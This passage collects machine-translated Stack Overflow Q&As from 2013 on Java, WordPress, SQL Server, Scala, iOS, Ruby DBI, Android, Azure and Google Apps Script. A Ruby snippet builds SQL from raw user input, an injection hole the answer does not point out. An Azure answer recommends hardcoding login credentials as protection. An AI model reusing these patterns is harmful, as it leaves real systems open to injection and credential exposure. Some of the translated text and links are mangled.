            System.out.println(i);
            x[i] = value2 + i;
            value2 ++;

        }
    }
}
} 
```

提前致谢。:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:15:55.320

您尚未初始化数组`x`：

```
value1 = Double.parseDouble(maxValue1.getText());
value2 = Double.parseDouble(maxValue2.getText());

int length = (int) value1;
x = new double[length];

for(int i = 0; i < length; i++)
{
    System.out.println(i);
    x[i] = value2 + i;
    value2 ++;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-12T15:58:51.437

您的意思是 maxValue1 是最小值，而 maxValue2 是该范围内的最大值吗？如果是这样试试这个：

```
 public void actionPerformed(ActionEvent event) {
        value1 = Double.parseDouble(maxValue1.getText());
        value2 = Double.parseDouble(maxValue2.getText());

        int length = (int) value2 + 1 - (int) value1;
        x = new double[length];

        for(int i = 0; i < length; i++)
        {
            x[i] = value1 + i;
            System.out.println(x[i]);
        } 
```

# wordpress - 如何在 WordPress 管理面板中突出显示评论？

> ID：15232115
> 
> 赞同：1
> 
> 时间：2013-03-05T19:08:59.833
> 
> 标签：wordpress, admin, highlight

我想在 WordPress 引擎的管理面板中突出显示作者评论。我的博客每天都有很多评论，有时在管理面板中很难找到我自己的评论。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-09T06:54:58.223

您还可以使用插件：[评论审核亮点](https://wordpress.org/plugins/comment-moderation-highlights/)

注意：我是插件开发人员。

设置它以便它查找您的电子邮件地址，选择一种颜色并保存。您的所有评论都将在评论管理中突出显示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T23:22:01.753

这可以通过有针对性的动作钩子和一些 CSS 来实现：

```
add_action( 'admin_head-edit-comments.php', 'colored_comments_so_15232115' );

function colored_comments_so_15232115()
{
    ?>
    <style>.comment-author-USER_LOGIN { background-color: #DFDB83 }</style>
    <?php
} 
```

替换`USER_LOGIN`为您的登录名。当然，您可以根据需要添加尽可能多的用户/背景颜色。

此 CSS 仅`/wp-admin/edit-comments.php`通过使用钩子打印在评论页面 () 中[`admin_head-$hook_suffix`](http://core.trac.wordpress.org/browser/tags/3.5.1/wp-admin/admin-header.php#L68)。

# javascript - Javascript - 从多种形式选择生成结果

> ID：15232121
> 
> 赞同：0
> 
> 时间：2013-03-05T19:09:13.587
> 
> 标签：javascript, forms, if-statement, multiple-choice

我是新来的，我也是编程新手，我很少编写任何代码，但最近我一直想改善我的工作场所，我只想为我的同事创建一个简单的表单。

简而言之，我创建了表单，我需要的只是将表单的所有结果生成到 textarea 中。

现在我的问题是，我已经以具有不同选择集的形式制作了几种类型的“事件”，而我想要的是生成的那组“事件”以及基本信息的结果。

好吧，这里是我的代码示例；开始 Javascript

```
function generateresult() {

name = document.FORM.namefromtextarea.value;
phone = document.FORM.phonefromtextarea.value;
address = document.FORM.addressfromtextarea.value;

name2 = "Name: " + name + "\n";
phone2 = "Phone: " + phone + "\n";
address2 = "Address: " + address + "\n";

//problem type 1

lostitem = document.FORM.lostitemfromtextarea.value;
when = document.FORM.whenfromtextarea.value;
where = document.FORM.wherefromtextarea.value;

lostitem2 = "Lost Item?: " + lostitem + "\n";
when2 = "When?: " + when + "\n";
where2 = "Where?: " + where + "\n";

//problem type 2

lostperson = document.FORM.lostpersonfromtextarea.value;
personage = document.FORM.personagefromtextarea.value;
personcloth = document.FORM.personclothfromtextarea.value;

lostperson2 = "Person Name?: " + lostperson + "\n";
personage2 = "Age?: " + personage + "\n";
personcloth2 = "Wearing?: " + personcloth + "\n";

if (document.FORM.problemtype.value="Lost Item")
{
eventtype = type1;
}
else if (document.FORM.problemtype.value="Lost Person")
{
eventtype = type2;
}

type1 = lostitem2 + when2 + where2 ;

type2 = lostperson2 + personage2 + personcloth2 ;

document.FORM.generateresulttext.value = name2 + phone2 + address2 + eventtype ;} 
```

结束

如果用户单击了值为“Lost Person”的选项，则生成文本的结果将取自事件“type2”

所以我设法得到了姓名、电话和地址的结果，但是对于丢失的项目结果，结果的值变成了“未定义”。

那么......我究竟该如何编码呢？我什至不确定我是否真的为我的简单表单做正确的脚本/方法......提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:36:24.987

在我看来，您可能正在尝试创建一个从不存在的元素中获取数据的变量。您可能希望将您拥有的代码放入另一个函数中。

```
function generateresult() {

name = document.FORM.namefromtextarea.value;
phone = document.FORM.phonefromtextarea.value;
address = document.FORM.addressfromtextarea.value;

name2 = "Name: " + name + "\n";
phone2 = "Phone: " + phone + "\n";
address2 = "Address: " + address + "\n";

//problem type 1
function firstType(){

    lostitem = document.FORM.lostitemfromtextarea.value;
    when = document.FORM.whenfromtextarea.value;
    where = document.FORM.wherefromtextarea.value;

    lostitem2 = "Lost Item?: " + lostitem + "\n";
    when2 = "When?: " + when + "\n";
    where2 = "Where?: " + where + "\n";

    document.FORM.generateresulttext.value = name2 + phone2 + address2 + lostitem2 + when2 + where2 ;
}

//problem type 2
function secondType(){

    lostperson = document.FORM.lostpersonfromtextarea.value;
    personage = document.FORM.personagefromtextarea.value;
    personcloth = document.FORM.personclothfromtextarea.value;

    lostperson2 = "Person Name?: " + lostperson + "\n";
    personage2 = "Age?: " + personage + "\n";
    personcloth2 = "Wearing?: " + personcloth + "\n";

    document.FORM.generateresulttext.value = name2 + phone2 + address2 + lostperson2 + personage2 + personcloth2 ;
}

if (document.FORM.problemtype.value="Lost Item")
{
    firstType();
}
else if (document.FORM.problemtype.value="Lost Person")
{
    secondType();
}

} 
```

将来，您不应该将数字放在变量的名称中。你也不应该像在这里一样声明变量。当你想创建一个变量时，你输入`var variableName = variableValue`. 您也永远不要使用类似`where`或这样`when`的词作为变量名，而是将其命名为类似`lostWhere`或`lostWhen`。

# sql - sql 视图中的对象名称无效

> ID：15232137
> 
> 赞同：2
> 
> 时间：2013-03-05T19:10:34.253
> 
> 标签：sql, sql-server, sql-server-2008, sql-view

由于一些部署限制，我不能在我的项目中使用同义词，所以相反，我创建了这个视图：

```
CREATE VIEW [dbo].[User] AS SELECT * FROM [PersonalData].[dbo].[User] 
GO 
```

它工作正常，但现在我需要修改它如下：

```
ALTER VIEW [dbo].[User] AS 
    SELECT [Id],
    t.[Name] AS [Title],
    [FirstName],
    [LastName],
    [JobTitle],
    [Department],
    [EmailAddress],
    [PhoneNumber],
    [PhoneExtension],
    [MobilePhoneNumber],
    [CreatedDate],
    [ModifiedDate],
    [Uid],
    [Active]
    FROM [PersonalData].[dbo].[User] AS u
    LEFT OUTER JOIN [PersonalData].[dbo].[Titles] AS t ON u.TitleId = t.Id 
GO 
```

目前，它失败了：

```
Ambiguous column name 'Id' 
```

`LEFT OUTER JOIN`在行中。

但是，Microsoft SQL Management Studio 突出显示`[PersonalData].[dbo].[Titles]`错误：

```
Invalid object name '[PersonalData].[dbo].[Titles] 
```

事实上，它并没有为我提供该表的列的 IntelliSense。

桌子`[PersonalData].[dbo].[Titles]`在那里。事实上，以下查询返回的结果没有错误：

```
select * from [PersonalData].[dbo].[Titles] 
```

我对 SQL 的了解不够深入，但我不明白为什么会这样，为什么它找到`Users`table 但没有找到`Titles`。

更多上下文：

*   我正在创建的视图不在`PersonalData`数据库中，而是在其他名为`Platform`.
*   我检查了上下文，没关系，我正在`Platform`数据库中创建视图。

为什么会这样？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-05T20:10:20.457

IntelliSense 问题是外围问题，可能是因为：

1.  前面的语法错误（你需要告诉 SQL Server你的意思，因为*它* `Id`存在于两个表中），或者
2.  that your local IntelliSense cache is stale. You can fix this by issuing `Ctrl`+`Shift`+`R` or using `Edit > IntelliSense > Refresh Local Cache` (and, depending on the network connection to the server, waiting seconds or even minutes).

That said, I would suggest two changes, one serious and one just a best practice:

1.  Don't name columns `Id`. The name is completely meaningless. Is it a `UserID`? Ok, call it `UserID` wherever it appears in the schema.
2.  Properly prefix *all* of the columns in your queries, not just the ones that have a name collision. This makes your query easier to understand and prevents people having to go manually figure out which table a column comes from.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-05T19:56:38.953

您需要将表名添加到您的`[id]`字段中。因为该字段在两个表中，所以它被认为是模棱两可的（视图不知道从哪个表中获取它）。

```
SELECT u.[Id] AS [id] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T19:19:10.570

尝试

```
ALTER VIEW [dbo].[User] AS 
    SELECT u.[Id], 
```

您的用户表和标题选项卡似乎都有一个名为“Id”的列。它告诉您它不知道您在 SELECT 列列表中指的是哪个 Id 列。

# scala - Scala中的隐式冲突

> ID：15232142
> 
> 赞同：1
> 
> 时间：2013-03-05T19:10:51.297
> 
> 标签：scala, implicit-conversion, implicit

以下 Scala 代码可以正常工作：

```
val str1 = "hallo"
val str2 = "huhu"
val zipped: IndexedSeq[(Char, Char)] = str1.zip(str2) 
```

但是，如果我导入隐式方法

```
implicit def stringToNode(str: String): xml.Node = new xml.Text(str) 
```

然后 Scala (2.10) 编译器显示错误：`value zip is not a member of String`

似乎存在以`stringToNode`某种方式阻止了`str1`和的隐式`str2`转换`WrappedString`。为什么？有没有办法修改`stringToNode`这样的方法，`zip`但当`stringToNode`我调用一个需要带`Node`参数的函数时仍然使用`String`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-05T19:25:22.633

你在这里有模棱两可的暗示。StringOps 和 xml.Node 都有 zip 方法，因此隐式转换不明确，无法解析。我不知道为什么它没有给出更好的错误信息。

以下是一些备份它的链接： [http](http://www.scala-lang.org/api/current/index.html#scala.collection.immutable.StringOps) ://www.scala-lang.org/api/current/index.html#scala.collection.immutable.StringOps 和 [http://www.scala-lang.org/api /current/index.html#scala.xml.Node](http://www.scala-lang.org/api/current/index.html#scala.xml.Node)

**编辑**：它是 StringOps，而不是 WrappedString，更改了链接 :) 看看 Predef：[http](http://www.scala-lang.org/api/current/index.html#scala.Predef) ://www.scala-lang.org/api/current/index.html#scala.Predef $ 查看 Scala 中的预定义隐式.

在这种情况下，我会避免使用隐式。您需要 2 个不同的隐式转换，它们都提供同名的方法 ( `zip`)。我不认为这是可能的。此外，如果您导入 xml.Text，您可以使用`Text(str)`对任何人都足够简洁的转换。如果您必须将此隐式转换为 xml.Node，我会将隐式 def 打包到一个对象中，然后仅将其导入您需要它以使您的代码可读的地方，并可能避免在您还需要的地方发生冲突拉链字符串。但基本上，我会非常避免使用隐式来进行方便的转换。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-05T19:42:05.320

就像@Felix 写的那样，定义类似数据类型之间的隐式转换通常是一个坏主意，就像您使用的那样。这样做会削弱类型系统，导致像您遇到的模棱两可，并可能产生非常不清楚（“魔术”）的代码，很难分析和调试。

Scala 中的隐式转换主要用于定义轻量级、短寿命的包装器，以丰富包装类型的 API。`String`转换成的隐式转换`WrappedString`属于该类别。

Twitter 的[Effective Scala](http://twitter.github.com/effectivescala/#Types%20and%20Generics-Implicits)有一个关于这个问题的部分。

# asp.net - DevExpress Pivot Grid 不接受格式字符串

> ID：15232144
> 
> 赞同：1
> 
> 时间：2013-03-05T19:10:58.430
> 
> 标签：asp.net, vb.net, devexpress

我的站点中有一个 DevExpress PivotGrid，它可以从 sql 视图中获取一堆数字。我想将它们格式化为小数点后 2 位。我尝试了以下方法：

```
<dx:pivotgridfield id="AverageDailySales" visible="True"
 fieldname="AvgDailySales" CellFormat-FormatString="(0:n2}" Options-AllowFilter="True"></dx:pivotgridfield> 
```

在 page_load 中：

```
AverageDailySales.CellFormat.FormatType = DevExpress.Utils.FormatType.Numeric
AverageDailySales.CellFormat.FormatString = "{0:n2}"
AverageDailySales.GrandTotalCellFormat.FormatType = DevExpress.Utils.FormatType.Numeric
AverageDailySales.GrandTotalCellFormat.FormatString = "{0:n2}" 
```

但它仍然没有格式化到两个地方。当我把它作为一个数据字段（我得到一个总计列）时，它就起作用了。否则不会。知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-16T18:14:27.140

我相信您的格式字符串不正确，它不应该包含 0 标识符。这应该是：

```
<dx:pivotgridfield id="AverageDailySales" visible="True"
 fieldname="AvgDailySales" CellFormat-FormatString="n2" Options-AllowFilter="True"></dx:pivotgridfield> 
```

通常，DevExpress 中的格式字段只查找要使用的格式，并假设只有一个值要格式化。我也是基于 DevExpress [How to: Format Cells](http://documentation.devexpress.com/#AspNet/CustomDocument7240)文档。

# gwt - 为什么要有 .shared.GWT 和 .client.GWT？

> ID：15232149
> 
> 赞同：4
> 
> 时间：2013-03-05T19:11:17.640
> 
> 标签：gwt

由于 Javadoc 没有明确说明使用[com.google.gwt.core 的原因。**共享**.GWT](http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/gwt/core/shared/GWT.html)，它似乎包含[com.google.gwt.core 的功能子集。**客户端**.GWT](http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/gwt/core/client/GWT.html)，前者存在的原因是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:15:51.967

顾名思义，`shared.GWT`可以在服务器端使用。`GWT.create()`还不支持很多东西，但很快就会支持 I18N，例如，它是可插拔的。

# ios - 内存泄漏从服务器下载图像

> ID：15232150
> 
> 赞同：1
> 
> 时间：2013-03-05T19:11:21.307
> 
> 标签：ios, image, memory, memory-leaks

我有一个分页滑块视图，每页上都有一个图像。我`NSOperationQueue`用来帮助我在程序运行时从服务器下载图像。`NSOperationQueue`用于调用以下方法，

```
-(NSData *)imageWith:(NSString *)imageName
{

NSString *imagePath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0] stringByAppendingPathComponent:imageName];
NSData *imageData = [NSData dataWithContentsOfFile:imagePath];

if (!imageData) {

   imageData = [[NSData alloc] initWithContentsOfURL:[NSURL URLWithString:[[NSString stringWithFormat:@"%@/%@", picsURL,imageName] stringByAddingPercentEscapesUsingEncoding:NSASCIIStringEncoding]]];

    if (imageData) {

        [imageData writeToFile:imagePath atomically:YES];
    }
}     
 return imageData;
} 
```

然后我使用主线程在滚动视图上显示下载的图像：

```
[self performSelectorOnMainThread:@selector(loadPic:) withObject:[NSArray arrayWithObjects:[self imageWith:[picsNames objectAtIndex:imageView.tag]], [NSString stringWithFormat:@"%d", imageView.tag], nil] waitUntilDone:YES]; 
```

它调用以下方法：

```
-(void)loadPic:(NSArray *)imageAndTagArray
{
    if (imageAndTagArray.count) {

    //loading the image to imageview
    UIImageView *imageView = (UIImageView *)[scrollView viewWithTag:[[imageAndTagArray objectAtIndex:1] intValue]];
    imageView.image = [UIImage imageWithData:((NSData *)[imageAndTagArray objectAtIndex:0])];

    //stopping the indicator
    [((UIActivityIndicatorView *)[imageView viewWithTag:ACTIVITY_INDICATOR_TAG]) stopAnimating];
}
} 
```

前 60 张图片一切正常，但之后我收到内存警告，大约 100 张图片后应用程序崩溃。

我在这方面花了很多时间，但我不知道该怎么做。我用过 Instruments，它没有检测到任何泄漏。我也使用了分析，这也显示了任何东西。

编辑：

如果我用以下定义替换 imageWith: 方法定义，我仍然会收到警告，其中 5.jpg 是本地图像。

```
-(NSData *)imageWith:(NSString *)imageName
{
     return UIImagePNGRepresentation([UIImage imageNamed:@"5.jpg"]);
} 
```

让我告诉你更多的情况。

当应用程序启动时，我有一个视图，里面有一个分页滚动视图，每页包含 9 个图像。滚动视图使用 nsoperationqueue 加载调用 imageWith: 方法的图像。

当用户点击任何图像时，将打开第二个视图，并完整显示所选图像。第二个视图也有一个滚动视图，其中包含与第一个视图相同的图像，但具有完整显示，即每页一张图像。

当您在第二个视图上并来回滚动时，应用程序在加载大约 60 张图像后崩溃。如果说它加载了 50 张图像，然后您点击后退按钮并转到第一个视图，然后点击另一张图像并转到第二个视图并加载大约 10 张图像，它也会崩溃。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T22:57:31.777

听起来您在内存中保存了太多图像。当您打开第二个视图时，它会再次从磁盘重新加载图像，直到您最终得到所有图像的两个副本。

UIImage 类可能可以帮助您进行这种内存管理。在其[参考页面](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIImage_Class/Reference/Reference.html)中，它提到它能够在内存不足的情况下清除其数据，然后在需要再次绘制文件时从磁盘重新加载文件。这可能是您的解决方案。

但是，当您从磁盘读取的 NSData 创建图像时， UIImage 可能无法清除其内存 - 它不会知道您的图像只是存储在磁盘上，因此它不能丢弃数据并稍后重新加载。

尝试更改您的“imageWith”方法以在它返回之前从磁盘上的文件 URL 创建一个 UIImage（通过 imageWithContentsOfFile），并返回 UIImage 而不是返回中间 NSData。这样，UIImage 将知道其图像源在磁盘上的哪个位置，并能够在设备上的内存受限时智能地清除/重新加载它。

# sql - Ruby dbi select 语句返回 BigDecimal？

> ID：15232155
> 
> 赞同：1
> 
> 时间：2013-03-05T19:11:33.193
> 
> 标签：sql, ruby, oracle, dbi

由于某种原因，我在将 ruby​​ 与 dbi 一起使用时遇到了问题，我正在尝试进行选择并将结果放入数组中，但没有运气。

```
require 'dbi'

db = DBI.connect('DBI:OCI8:database', XXXX, XXXX)

#Gets Consumer Id Number you want to create accounts for
numberOfAccounts = []
puts("Please enter a CID")
NewCID = gets.chomp()
numberOfAccounts << db.execute("select T_NBR from T_CBA where C_ID='#{NewCID}'").fetch 
```

我的数组最终是这样的：

```
[[<#BigDecimal:fc115f8,'0.8000169202 2E11',12(16)>]] 
```

我想有几个不同的数字，如 [222, 3232, 2323] 等。

我在网上搜索过，但无济于事。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:24:40.810

DBI 可能已根据数据字段确定基础列可能包含太大而无法放入常规 int 类型的整数。或者它可能只对所有整数类型使用 BigDecimal 以避免担心它。

如果您知道您的值都足够小以适合常规整数，则可以在填充数组后将数组转换为整数，如下所示：

```
1.9.3-p194 :014 > numberOfAccounts
=> [[#<BigDecimal:119cd90,'0.123E3',9(36)>], [#<BigDecimal:119cd18,'0.456E3',9(36)>]] 
1.9.3-p194 :015 > numberOfAccounts.flatten!.collect!(&:to_i)
=> [123, 456] 
1.9.3-p194 :016 > numberOfAccounts
=> [123, 456] 
```

# android - 如何避免果冻豆在后台杀死我的应用程序？

> ID：15232157
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:11:37.320
> 
> 标签：android, android-4.2-jelly-bean

我有一个语音识别应用程序，当用户按下主页按钮时，它会进入后台并仍在听命令。它在 2.3 及更高版本上运行良好，除了在几秒钟内杀死活动的果冻豆（在 ICS 上也可能发生，但通常会继续运行）。有什么办法可以避免果冻豆杀死我的活动吗？

谢谢，

卡洛斯。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:20:44.353

> 有什么办法可以避免果冻豆杀死我的活动吗？

Android 将在进入后台后的某个时间终止您的进程。这是完全正常和预期的。确切的时间范围将根据设备、操作系统版本和其他情况而有所不同。

欢迎您尝试重写您的应用程序以将语音识别移动到服务中，甚至可能是前台服务（通过`startForeground()`）。使用服务将在一定程度上增加您的流程的生命周期。使用前台服务将显着增加进程的生命周期。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:21:55.947

在编写应用程序逻辑时，您不应该依赖您的活动。因此，您将需要根据 android 活动生命周期管理太多事件。在[`Service`](http://developer.android.com/guide/components/services.html)这种情况下你应该使用

# algorithm - 创建平面图的对偶

> ID：15232160
> 
> 赞同：1
> 
> 时间：2013-03-05T19:11:42.170
> 
> 标签：algorithm, graph-algorithm

我正在查看此[pdf](http://courses.csail.mit.edu/6.889/fall11/lectures/L11.pdf)，因为我正在尝试构建 MSSP（多源最短路径），但我缺乏如何构建交叉树的知识。直到现在我创建了生成树，因此创建了平面图，但我卡住了，因为我不知道如何构建它的对偶。是否有任何特定的算法/方法或任何论文可以帮助我解决这个问题？当我搜索时，找不到任何有用的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T14:45:09.997

1.  如果您还没有，则需要组合嵌入。有一些有效的算法可以从关联结构中获得一个，但是平面图的自然来源通常具有自然嵌入。有很多方法可以表示嵌入。我使用排列 π 以逆时针顺序将每个半边映射到下一个半边，并具有相同的头顶点。每个（非隔离）顶点与传入半边的循环链接列表相关联。

2.  令 rev 为将每个半边映射到另一半的排列，具有相反的头和尾顶点。对偶图的嵌入排列是 π 和 rev 的组合。它按顺时针顺序将每个半边映射到面上的下一个半边（或在无限面上逆时针，因为您正在查看它的背面）。如果您手动尝试一些示例，这会更清楚。

3.  从初始根计算最短路径后（我使用了 Dijkstra，除非您的 MSSP 实现比我的快得多，否则使用渐近更快的算法并没有太大的相对改进），进行深度优先搜索，其中属于最短路径树的边被忽略。（另一种选择是以 Euler-tour 顺序访问叉指树的半边，但这种方法似乎会导致额外的对数时间动态树操作。）

# php - 基于 PHP 的 Azure 网站的身份验证选项？

> ID：15232161
> 
> 赞同：0
> 
> 时间：2013-03-05T19:11:45.220
> 
> 标签：php, azure, azure-web-app-service

我正在用 PHP 编写一个简单的管理工具，供我个人使用，我想将它托管在免费的 Azure 网站层上。我需要通过一个简单的身份验证方案来保护站点，例如 *NIX 服务器下的 .htpasswd。

在 PHP 中运行站点时，是否有任何推荐的方法来执行此操作？

我查看了 web.config 中的选项，但是它们似乎都需要一个 Windows 用户帐户来进行身份验证。我查看了[Windows Azure 基本身份验证](https://stackoverflow.com/questions/5772998/windows-azure-basic-authentication)，但我不太确定如何针对该网站运行 appcmd.exe。

我已经检查了 Windows Azure Active Directory 集成选项，但是我看不到可以从 PHP 调用的任何内容（是否有我可以调用的 RESTful API？）。

我不是特别想编写自己的身份验证处理程序，也不是特别想运行微实例 Linux VM....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T16:44:41.423

有一个示例项目展示了如何[使用 PHP 使用 Windows Azure Active Directory 进行单点登录](https://github.com/WindowsAzure/azure-sdk-for-php-samples/tree/master/WAAD.WebSSO.PHP)。

到目前为止，我还没有在 Windows Azure 网站中测试过此代码，但如果您想了解如何实现自己的身份验证提供程序，它可以作为示例提供。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T01:43:23.067

如果您正在寻找简单的身份验证，您可以在登录脚本本身中对用户名和密码组合进行硬编码，并且信息将受到保护。如果这不能满足您的要求，您可以使用免费版本的 mysql 并在使用之前存储凭据。这两个选项是您可以使用的最简单且免费的选项。此外，基于 Active Directory 或 UAC 的身份验证对于您的小型项目来说是多余的。

# google-apps-script - Google Apps for Business：防止用户为全天活动预留资源

> ID：15232162
> 
> 赞同：0
> 
> 时间：2013-03-05T19:11:46.603
> 
> 标签：google-apps-script, google-calendar-api

我公司有15个房间。每个房间都是一个单独的资源。最终用户有时不是很聪明。有时他们会为全天的活动预订房间，而其他人无法预订一整天的房间。这就是为什么我希望用户不能为全天活动预订房间，而是指定时间范围。有没有办法用谷歌脚本做到这一点？

我在想，做到这一点的一种方法可能是在每次创建事件时运行一个脚本。如果它的位置在其中一个房间中，并且是全天活动，请将其删除并提示用户重试。

所以这就是问题所在——似乎没有一种方法可以创建在事件创建时触发的触发器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:14:53.217

我在我工作的学校也遇到过几乎相同的情况。我们有大约 20 个教室，其中一些有共享访问权限（作为日历资源）。问题是一些最终用户在不关心其他人并且不告诉任何人的情况下使用它......所以我制作了一个每小时运行一次的“跟踪脚本”并检查是否已将事件添加到资源日历中；如果是这样，它会向我发送一封邮件，以便我查看并处理这种情况。

几周后，用户对如何使用资源变得更加小心，因为他们知道自己受到监视 ;-) 所以我不需要删除“坏事件”，他们自己更改！

无论如何，我想我写的脚本可以很容易地修改以删除事件，如果它们是“ALL DAY”。

几句话来解释：脚本会记录一段时间内的所有事件（在 ScriptProperties 中）。每隔一小时左右，它会检查是否添加或删除了某个事件，它还会检查是谁做的，如果它不是“白名单”用户，它会向我发送一封电子邮件，其中包含更改内容的摘要（以 HTML 表格式） . 它监视从现在到固定日期（对我来说是六月底）之间的所有事件。

我遇到的主要困难是处理由于日期而从列表中退出的事件......在第一个版本中，它在每个事件结束时间发送一封邮件......现在这个版本对我来说顺利运行了几个月虽然它并不完美，但对你来说可能是一个很好的起点（至少我希望如此:-)

还有一个手动记录实用程序来获取任何开始/结束日期之间的电子表格中的所有事件和另一个实用程序来获取脚本的日历 ID。

这是[电子表格的公开副本，](https://docs.google.com/spreadsheet/ccc?key=0AnqSFd3iikE3dExMUm1TSU1MZEpVelNYMG95TTFad1E&usp=sharing)您可以查看

这是完整的脚本（有点长，抱歉）

```
 var nom = String(Session.getUser().getUserLoginId());
  var authorized = ['admin','webmaster','mary','william'];// define a list of 'authorized event creators'
  var owner = 'mail@xxx.yyy';// email to whom the email will be sent
  var collaborator = 'a collaborator email';// email of an additional collaborator (optional, see line 93)
  var ss = SpreadsheetApp.getActiveSpreadsheet();// this spreadsheet
  var sh = ss.getSheetByName('master');
  var calList = sh.getDataRange().getValues();
  var logsheet = ss.getSheetByName('logger');
  var last = logsheet.getLastRow();
  var FUS1=new Date().toString().substr(25,6)+":00";

function onOpen() {
  var menuEntries = [ {name: "Manual test", functionName: "checkCal"},
                      {name: "Lauch autoTest", functionName: "manualcheck"},
                      {name: "delete created sheets", functionName: "delsheets"}
                     ];
    var sheet = SpreadsheetApp.getActiveSpreadsheet();
    sheet.addMenu("Tracking utilities",menuEntries);//
//  Logger.log(FUS1)
  SpreadsheetApp.setActiveSheet(sheet.getSheetByName('logger'));// start on logger page  
}

function manualcheck(){
    autoCheckAllCals();
    var sheet = SpreadsheetApp.getActiveSpreadsheet();
    if(sheet.getSheets()>1){
    SpreadsheetApp.setActiveSheet(sheet.getSheets()[2]);// this works from the menu when ss is open
}
}

function autoCheckAllCals(){
    var eventarray = new Array();
    var logarray = new Array();
    var line = new Array();
    ss.setActiveSheet(logsheet)
    line.push('Events created by someone else','start ','end','location','Creator','Modification','event length','invited');
    eventarray.push(line);
    var today =  new Date(); // maintenant
    var startDate = new Date(today.getTime()-120*60*1000);// 2h before now
    var endDate = new Date("june 30, 2013 23:59:00"); // choice every year
    var sendMail = true    
    var mailSent = false
    logsheet.insertRowAfter(last)
    var sheetName = "Control from "+ Utilities.formatDate(startDate, FUS1, "MMM-dd-yy")
      + "-to-" + Utilities.formatDate(endDate, FUS1, "MMM-dd-yy")  
  for(nn=0;nn<calList.length;++nn){
    var calName = calList[nn][0];
    var calId = calList[nn][1];   
// Logger.log(calList)   
// Logger.log(startDate+'  |  '+endDate)   
// Logger.log(calName+' | '+calId)
    var Calendar = CalendarApp.getCalendarById(calId)
        var events = Calendar.getEvents(startDate , endDate);
    if (events[0]) {
    for (var i = 0; i < events.length; i++) {
      if(events[i].getTitle().match('week nr')=='week nr'){continue};// this condition to ignore week numbers that we add in all calendars.... might be anything else that should be ignored
      var skip = false
      for(var aaa in authorized){
//Logger.log(events[i].getCreators())
      if(events[i].getCreators().join().match(authorized[aaa])==authorized[aaa]){skip=true;continue};// check if creator is in the 'authorized' list
        }
        if(skip){continue}
//Logger.log(events[i].getStartTime()+'   '+events[i].getEndTime());      
      if(events[i].getStartTime()<today||events[i].getEndTime()<today){Logger.log('condition < today = true '
         +events[i].getTitle()+' start='+Utilities.formatDate(events[i].getStartTime(), FUS1, "HH:mm")+' end='+Utilities.formatDate(events[i].getEndTime(), FUS1, "HH:mm"));sendMail=false;continue}
// if condition = true update script properties so it won't generate an alert when finishing
      var line = new Array();
      var logline = new Array();
      FUS1=events[i].getStartTime().toString().substr(25,6)+":00";
      line.push(calName +' : '+events[i].getTitle());
      logline.push(calName +' : '+events[i].getTitle()+'|');
      line.push(Utilities.formatDate(events[i].getStartTime(), FUS1, "MMM-dd-yy")+' @ ' +Utilities.formatDate(events[i].getStartTime(), FUS1, "HH:mm"));
      logline.push(Utilities.formatDate(events[i].getStartTime(), FUS1, "MMM-dd-yy")+' @ ' +Utilities.formatDate(events[i].getStartTime(), FUS1, "HH:mm")+'|');
      line.push(Utilities.formatDate(events[i].getEndTime(), FUS1, "MMM-dd-yy")+' @ ' +Utilities.formatDate(events[i].getEndTime(), FUS1, "HH:mm"));
      line.push(events[i].getLocation());      
      line.push(events[i].getCreators().join());
      logline.push(events[i].getCreators().join()+'∏');
      line.push('on '+Utilities.formatDate(events[i].getLastUpdated(), FUS1, "MMM-dd-yy"))
      line.push(((events[i].getEndTime() - events[i].getStartTime()) / 3600000)+' hours');
      var invitelist='';
      var list = events[i].getGuestList()
          for(n=0;n<list.length;++n){invitelist+=list[n].getName()+', '}
      line.push(invitelist)
      eventarray.push(line);
      logarray.push(logline)
    }
//    Logger.log(logarray)
    }    
}
      if(eventarray.length>1){     
  var message = logarray.toString().replace(/,/g,'')
  var formertest = ScriptProperties.getProperty('lastTest')
      if(formertest!=message){
Logger.log('changement ...')        
  var html = createMsg(message)
  if(sendMail){
      MailApp.sendEmail(owner,'Events created by someone in your calendar', "", {"htmlBody" : html});
//      MailApp.sendEmail(collaborator,'Events created by someone in your calendar', "", {"htmlBody" : html});// supprimer ou commenter cette ligne si nécessaire
Logger.log('send mail')
mailSent = true
  }
    ScriptProperties.setProperties({'lastTest': message}, true);   
      try{ 
    var newsheet = ss.insertSheet(sheetName,2);
      }catch(error){
        FUS1=new Date().toString().substr(25,6)+":00";
        var newsheet = ss.insertSheet(sheetName+' - '+Utilities.formatDate(new Date(), FUS1, "HH:mm:ss"),2);
        }
    newsheet.getRange(1,1,eventarray.length,eventarray[0].length).setValues(eventarray);
    newsheet.getRange(1,1,1,eventarray[0].length).setBackgroundColor('#ffffcc');
    newsheet.setColumnWidth(1, 350).setColumnWidth(2, 150).setColumnWidth(3, 150).setColumnWidth(4, 150).setColumnWidth(5, 150).setColumnWidth(6, 105).setColumnWidth(7, 95).setColumnWidth(8, 450);
